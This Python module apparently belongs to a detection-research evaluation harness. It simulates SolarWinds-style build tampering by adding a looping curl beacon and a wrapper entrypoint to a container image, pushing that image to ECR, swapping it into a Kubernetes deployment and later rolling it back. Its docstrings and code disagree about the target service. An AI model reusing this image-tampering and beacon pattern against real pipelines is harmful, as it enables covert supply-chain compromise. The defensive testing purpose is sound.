"""
research/evaluation/attacks/solarwinds_style.py

SolarWinds-style build artifact tampering scenario.

Handoff §2 specification:
    Target workload:  cartservice (Go/dotnet, long-lived)
    Clean component:  pkg:nuget/StackExchange.Redis@2.6.122
    Extra component:  pkg:generic/phantom-background-worker@0.1.0
    SBOM:             Clean (does NOT declare phantom-background-worker)
    Mechanism:        Modified image runs legitimate service + background
                      worker process. SBOM is unchanged from clean build.
    Detection window: 120 seconds (from Pod ready state)
    Expected eBPF evidence:
        - Additional persistent process under the container ID
          (phantom-worker running alongside dotnet/cartservice)
        - PHANTOM_EVT_EXEC: unexpected execve for phantom-worker
        - PHANTOM_EVT_NET_CONNECT: periodic TCP attempts to phantom-sink:4446
        - PHANTOM_EVT_FILE_OPEN: reads by undeclared phantom-worker binary

Key distinction from other attacks:
    The SBOM is CLEAN and VALID. PHANTOM must detect drift from runtime
    behavior that has no declared SBOM counterpart, not from a substituted
    package. This tests whether PHANTOM notices an undeclared component's
    behavioral contract violations.

Mechanism:
    1. Build the attack image locally (or use pre-built):
       - Start FROM the clean cartservice image.
       - ADD /usr/local/bin/phantom-worker (the beacon binary/script).
       - Change ENTRYPOINT to /usr/local/bin/start.sh which runs both:
           exec dotnet /app/cartservice.dll &
           exec /usr/local/bin/phantom-worker
       - Tag as {ATTACK_IMAGE}.
    2. kubectl set image deployment/cartservice to the attack image.
    3. Wait for Pod rollout.
    4. Verify phantom-worker is running (kubectl exec ps aux | grep phantom-worker).

Recovery:
    1. kubectl rollout undo deployment/cartservice (reverts to previous RS).
    2. Wait for Pod ready.
    3. Verify no phantom-worker process.

Safety:
    - phantom-worker is a shell script: sleep 60; curl -sf phantom-sink:4446 || true
    - curl target is cluster-internal ClusterIP only.
    - No persistent storage writes; no process capability escalation.
"""

from __future__ import annotations

import logging
import subprocess
import textwrap
import time
from pathlib import Path

from research.evaluation.attacks.base_attack import AttackManifest, BaseAttack

log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Artifact paths
# ---------------------------------------------------------------------------

_ARTIFACTS_DIR = (
    Path(__file__).resolve().parents[3]
    / "research" / "evaluation" / "artifacts" / "solarwinds"
)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_SINK_HOST = "phantom-sink.phantom-eval.svc.cluster.local"
_SINK_PORT = 4446
_WORKER_BIN = "/usr/local/bin/phantom-worker"
_WORKER_PROCESS_NAME = "phantom-worker"
_DEPLOYMENT_NAME = "emailservice"

# The phantom-worker beacon script (written into the attack image).
_WORKER_SCRIPT = textwrap.dedent("""\
    #!/bin/sh
    # phantom-worker — PHANTOM evaluation background beacon (safe research artefact)
    # Sleeps, then sends a probe to the controlled sink endpoint. Loops indefinitely.
    SINK_HOST="{sink_host}"
    SINK_PORT="{sink_port}"
    while true; do
        sleep 60
        curl -sf "http://${{SINK_HOST}}:${{SINK_PORT}}/probe" \\
            -d "phantom-worker-probe" \\
            --max-time 5 \\
            --connect-timeout 3 \\
            --no-keepalive >/dev/null 2>&1 || true
    done
""").format(sink_host=_SINK_HOST, sink_port=_SINK_PORT)

# The modified entrypoint script.
_START_SCRIPT = textwrap.dedent("""\
    #!/bin/sh
    # start.sh — modified entrypoint for PHANTOM SolarWinds-style evaluation.
    # Starts the legitimate emailservice AND the phantom-worker.
    /usr/local/bin/phantom-worker &
    exec /start.sh "$@"
""")

# The Dockerfile for the attack image.
_DOCKERFILE_TEMPLATE = textwrap.dedent("""\
    FROM {clean_image}

    # Add the background worker beacon script.
    COPY phantom-worker {worker_bin}
    RUN chmod +x {worker_bin}

    # Add the modified entrypoint wrapper.
    COPY start.sh /usr/local/bin/start.sh
    RUN chmod +x /usr/local/bin/start.sh

    # Override entrypoint to launch both the worker and the original service.
    ENTRYPOINT ["/usr/local/bin/start.sh"]
    CMD {original_cmd}
""")

# ---------------------------------------------------------------------------
# Attack manifest
# ---------------------------------------------------------------------------

_CLEAN_IMAGE = "tiangolo/uwsgi-nginx-flask:python3.11"
_ECR_REGISTRY = "596717729313.dkr.ecr.ap-south-1.amazonaws.com"
_ECR_REGION = "ap-south-1"
_ATTACK_IMAGE_TAG = f"{_ECR_REGISTRY}/phantom/api-gateway:solarwinds-eval"

SOLARWINDS_MANIFEST = AttackManifest(
    attack_id="solarwinds-001",
    attack_family="build_pipeline_tampering",
    target_service=_DEPLOYMENT_NAME,
    target_image=_ATTACK_IMAGE_TAG,
    target_component_purl="pkg:generic/phantom-background-worker@0.1.0",
    clean_component_purl="pkg:nuget/StackExchange.Redis@2.6.122",
    injection_time_offset_s=0.0,
    expected_behavioral_changes=[
        "unexpected_process_spawn",      # phantom-worker execve
        "unexpected_network_connect",    # curl to phantom-sink:4446
        "unexpected_file_access",        # binary reads by phantom-worker
    ],
    ground_truth_label=1,
    control_endpoint=f"{_SINK_HOST}:{_SINK_PORT}",
    recovery_steps=[
        f"kubectl rollout undo deployment/{_DEPLOYMENT_NAME}",
        "Wait for Pod ready (kubectl rollout status)",
        "Verify no phantom-worker in ps aux output",
    ],
    detection_window_s=120.0,
    repetitions=3,
    notes=(
        "Handoff §2 SolarWinds-style Build Artifact Tampering. "
        "SBOM remains clean; runtime has an extra undeclared process. "
        "Tests SBOM-runtime behavioral divergence detection specifically. "
        "Beacon: sleep 60; curl phantom-sink:4446 (cluster-internal ClusterIP)."
    ),
)


# ---------------------------------------------------------------------------
# Attack class
# ---------------------------------------------------------------------------


class SolarWindsStyleAttack(BaseAttack):
    """SolarWinds-style build artifact tampering for PHANTOM evaluation.

    Deploys a modified cartservice image that runs the legitimate service
    plus a background phantom-worker beacon process. The SBOM is the
    original clean SBOM, so PHANTOM must detect behavioral divergence
    from the declared contract — not a substituted package.

    Args:
        clean_image: Docker image of the clean cartservice.
        kubectl_context: kubectl context name.
        dry_run: If True, log commands without executing.
        build_attack_image: If True, build the attack image locally.
            If False, assume the image is pre-built and available.
        target_namespace: Kubernetes namespace of cartservice.
    """

    manifest: AttackManifest = SOLARWINDS_MANIFEST

    def __init__(
        self,
        clean_image: str = _CLEAN_IMAGE,
        kubectl_context: str | None = None,
        dry_run: bool = False,
        build_attack_image: bool = True,
        target_namespace: str = "default",
    ) -> None:
        """Initialise the SolarWinds-style attack.

        Args:
            clean_image: Base image to build the attack image FROM.
            kubectl_context: kubectl context name.
            dry_run: If True, log commands without executing.
            build_attack_image: Build the attack image if True.
            target_namespace: Namespace where cartservice runs.
        """
        super().__init__(kubectl_context=kubectl_context, dry_run=dry_run)
        self._clean_image = clean_image
        self._build_attack_image = build_attack_image
        self._target_namespace = target_namespace
        self._attack_image = _ATTACK_IMAGE_TAG
        self._original_image: str | None = None  # recorded before injection

    def _build_image(self) -> None:
        """Build the attack Docker image locally.

        Writes Dockerfile, phantom-worker script, and start.sh into
        artifacts/solarwinds/, then runs docker build.
        """
        build_dir = _ARTIFACTS_DIR
        build_dir.mkdir(parents=True, exist_ok=True)

        # Write worker script.
        (build_dir / "phantom-worker").write_text(_WORKER_SCRIPT)

        # Write start.sh entrypoint wrapper.
        (build_dir / "start.sh").write_text(_START_SCRIPT)

        # Write Dockerfile.
        # The original CMD for cartservice is typically empty (set by base image).
        dockerfile = _DOCKERFILE_TEMPLATE.format(
            clean_image=self._clean_image,
            worker_bin=_WORKER_BIN,
            original_cmd='[]',  # Use inherited CMD from base image.
        )
        (build_dir / "Dockerfile").write_text(dockerfile)

        if self.dry_run:
            log.info("solarwinds.dry_run.docker_build_skipped")
            return

        result = subprocess.run(
            ["docker", "build", "-t", self._attack_image, "."],
            cwd=str(build_dir),
            capture_output=True,
            text=True,
            timeout=300,
            check=False,
        )
        if result.returncode != 0:
            raise RuntimeError(
                f"docker build failed: {result.stderr[:400]}"
            )
        log.info("solarwinds.image_built", extra={"tag": self._attack_image})

        # Push to ECR so cluster nodes can pull the attack image.
        # Login to ECR first.
        login_result = subprocess.run(
            ["bash", "-c",
             f"aws ecr get-login-password --region {_ECR_REGION} "
             f"| docker login --username AWS --password-stdin {_ECR_REGISTRY}"],
            capture_output=True, text=True, timeout=60, check=False,
        )
        if login_result.returncode != 0:
            raise RuntimeError(f"ECR login failed: {login_result.stderr[:200]}")

        push_result = subprocess.run(
            ["docker", "push", self._attack_image],
            capture_output=True, text=True, timeout=300, check=False,
        )
        if push_result.returncode != 0:
            raise RuntimeError(f"docker push failed: {push_result.stderr[:200]}")
        log.info("solarwinds.image_pushed", extra={"tag": self._attack_image})

    def _get_current_image(self) -> str:
        """Read the current container image from the deployment.

        Returns:
            Current image string.
        """
        result = self._kubectl(
            [
                "get", "deployment", _DEPLOYMENT_NAME,
                "-n", self._target_namespace,
                "-o", "jsonpath={.spec.template.spec.containers[0].image}",
            ],
            timeout=15,
        )
        return result.stdout.strip()

    def inject(self, target_namespace: str, pod_name: str) -> bool:
        """Replace the cartservice image with the attack image.

        Steps:
          1. Record the current (clean) image for recovery.
          2. Optionally build the attack image.
          3. kubectl set image deployment/cartservice to attack image.
          4. Wait for Pod rollout to complete.

        Args:
            target_namespace: Kubernetes namespace of cartservice.
            pod_name: Pod name (used only for logging; deployment-level
                operation does not target a specific pod).

        Returns:
            True if injection succeeded.
        """
        log.info(
            "solarwinds.inject.start",
            extra={"namespace": target_namespace},
        )

        # 1. Record current image for rollback.
        self._original_image = self._get_current_image()
        log.info("solarwinds.inject.original_image", extra={"image": self._original_image})

        # 2. Build attack image if requested.
        if self._build_attack_image:
            self._build_image()

        # 3. Discover the actual container name in the deployment.
        container_name_result = self._kubectl(
            [
                "get", "deployment", _DEPLOYMENT_NAME,
                "-n", target_namespace,
                "-o", "jsonpath={.spec.template.spec.containers[0].name}",
            ],
            timeout=15,
        )
        container_name = container_name_result.stdout.strip() or "server"
        log.info("solarwinds.inject.container_name", extra={"container_name": container_name})

        # 4. Set the attack image on the deployment.
        self._kubectl(
            [
                "set", "image",
                f"deployment/{_DEPLOYMENT_NAME}",
                f"{container_name}={self._attack_image}",
                "-n", target_namespace,
            ],
            timeout=30,
        )
        log.info("solarwinds.inject.image_set", extra={"attack_image": self._attack_image})

        # 4. Wait for rollout.
        try:
            self._kubectl(
                [
                    "rollout", "status",
                    f"deployment/{_DEPLOYMENT_NAME}",
                    "-n", target_namespace,
                    "--timeout=120s",
                ],
                timeout=130,
            )
        except subprocess.CalledProcessError as exc:
            log.error("solarwinds.inject.rollout_failed", extra={"error": str(exc)})
            return False

        log.info("solarwinds.inject.rollout_complete")
        return True

    def verify_injection(self, target_namespace: str, pod_name: str) -> bool:
        """Verify phantom-worker is running in the new pod.

        Finds live pods (post-rollout) and checks /proc/*/cmdline for the worker process.

        Args:
            target_namespace: Kubernetes namespace.
            pod_name: Pod name hint (may be stale; re-discover pod).

        Returns:
            True if phantom-worker is found in any running pod.
        """
        try:
            result = self._kubectl(
                [
                    "get", "pods",
                    "-n", target_namespace,
                    "-l", f"app={_DEPLOYMENT_NAME}",
                    "--field-selector", "status.phase=Running",
                    "-o", "jsonpath={.items[*].metadata.name}",
                ],
                timeout=15,
            )
            pods = result.stdout.strip().split()
            if not pods:
                log.warning("solarwinds.verify.no_running_pod")
                return False

            for live_pod in pods:
                proc_out = self._kubectl_exec(
                    namespace=target_namespace,
                    pod_name=live_pod,
                    command=["sh", "-c", "cat /proc/*/cmdline 2>/dev/null | tr '\\0' ' ' || true"],
                    timeout=15,
                )
                if _WORKER_PROCESS_NAME in proc_out or "phantom-worker" in proc_out:
                    log.info("solarwinds.verify.ok", extra={"pod": live_pod})
                    return True

            log.warning(
                "solarwinds.verify.worker_not_found",
                extra={"proc_excerpt": proc_out[:400] if 'proc_out' in locals() else ""},
            )
            return False
        except Exception as exc:
            log.error("solarwinds.verify.error", extra={"error": str(exc)})
            return False

    def recover(self, target_namespace: str, pod_name: str) -> bool:
        """Roll back the cartservice deployment to the clean image.

        Steps:
          1. kubectl rollout undo deployment/cartservice.
          2. Wait for Pod rollout.
          3. Verify no phantom-worker in the new pod.

        Args:
            target_namespace: Kubernetes namespace.
            pod_name: Pod name hint (ignored; deployment-level operation).

        Returns:
            True if recovery succeeded.
        """
        log.info(
            "solarwinds.recover.start",
            extra={"namespace": target_namespace},
        )

        ok = True

        # Rollback via undo (returns to the previous ReplicaSet).
        try:
            self._kubectl(
                [
                    "rollout", "undo",
                    f"deployment/{_DEPLOYMENT_NAME}",
                    "-n", target_namespace,
                ],
                timeout=30,
            )
        except subprocess.CalledProcessError as exc:
            log.error("solarwinds.recover.undo_failed", extra={"error": str(exc)})
            ok = False

        # Wait for rollout.
        try:
            self._kubectl(
                [
                    "rollout", "status",
                    f"deployment/{_DEPLOYMENT_NAME}",
                    "-n", target_namespace,
                    "--timeout=120s",
                ],
                timeout=130,
            )
        except subprocess.CalledProcessError as exc:
            log.warning("solarwinds.recover.status_failed", extra={"error": str(exc)})

        # Verify no phantom-worker.
        try:
            result = self._kubectl(
                [
                    "get", "pods",
                    "-n", target_namespace,
                    "-l", f"app={_DEPLOYMENT_NAME}",
                    "--field-selector", "status.phase=Running",
                    "-o", "jsonpath={.items[0].metadata.name}",
                ],
                timeout=15,
            )
            live_pod = result.stdout.strip()
            if live_pod:
                proc_out = self._kubectl_exec(
                    namespace=target_namespace,
                    pod_name=live_pod,
                    command=["sh", "-c", "cat /proc/*/cmdline 2>/dev/null | tr '\\0' ' ' || true"],
                    timeout=15,
                )
                if _WORKER_PROCESS_NAME in proc_out:
                    log.error("solarwinds.recover.worker_still_present")
                    ok = False
                else:
                    log.info("solarwinds.recover.worker_gone")
        except subprocess.CalledProcessError as exc:
            log.warning("solarwinds.recover.verify_failed", extra={"error": str(exc)})

        log.info("solarwinds.recover.complete", extra={"ok": ok})
        return ok
